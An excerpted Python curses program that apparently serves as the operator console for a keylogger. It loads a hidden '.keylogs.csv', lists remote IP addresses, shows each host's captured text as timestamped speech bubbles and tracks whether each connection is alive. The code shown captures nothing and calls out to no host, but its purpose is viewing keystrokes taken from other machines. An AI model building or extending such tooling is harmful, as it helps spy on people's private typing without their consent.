...
class Screen(object):
    ...
    def __init__(self, items):
        ...
        self.active_conv_status = 'Disconnected'

        self.init_curses()

        self.items = items
        self.current_ip = self.items[0]
        self.max_item_len = max([len(i) for i in items])
    ...
    def init_curses(self):
        ...
        curses.init_pair(5, curses.COLOR_GREEN, curses.COLOR_CYAN)
    ...
    def display_status_bar(self):
        ...
        status = f'ip:{self.current_ip} | Status : {self.active_conv_status} | Press Q for Quit'
        self.window.addstr(height - 1, 0, status)
        self.window.addstr(height - 1, len(status), " " * (width - len(status) - 1))
        self.window.attroff(curses.color_pair(3))


    def display_bubble_speach(self, box):
        df = pd.read_csv('.keylogs.csv')
        idx = 2
        cur_y = 2
        for i, row in enumerate(df[self.current_ip]):
            row = str(row)
            if not row:
                continue
            if (row == '200 NEW CONNEXION'):
                self.active_conv_status = 'Alive'
                continue
            elif (row == '500 KO'):
                self.active_conv_status = 'Disconnected'
                continue
            ...
            if tail == "L":
                ...
                bubble += (" " * 50) + "\\(  \n"
                bubble += (" " * 50) + " `\"-\n"
            for j, line in enumerate(bubble.split('\n')):
                if (j + idx * 3 >= curses.LINES):
                    return
                cur_y = j + idx * 3
                box.addstr(j + idx * 3, 4 if tail == 'L' else 70, line, curses.color_pair(2))
            if (cur_y + 1 >= curses.LINES):
                return
            box.addstr(cur_y, 50 - len(time) - 1 if tail == 'L' else 120 - len(time) -1, time, curses.color_pair(2))
            idx += 1
    ...
    def display(self):
        ...
        for idx, item in enumerate(self.items[self.top:self.top + self.max_lines]):
            ...
            if idx == self.current:
                ...
                box = curses.newwin(height, width - self.max_item_len, 0, self.max_item_len + 1)
                box.bkgd(' ', curses.color_pair(2) | curses.A_BOLD)
                box.box()
                self.current_ip = item
                self.display_bubble_speach(box)
            else:
                self.window.addstr(idx, 0, item.ljust(self.max_item_len), curses.color_pair(1))
...
def main():
    df = pd.read_csv('.keylogs.csv')
    items = list(filter(lambda x: ("Unnamed: 0" not in x), df.columns))
    screen = Screen(items)
    screen.run()
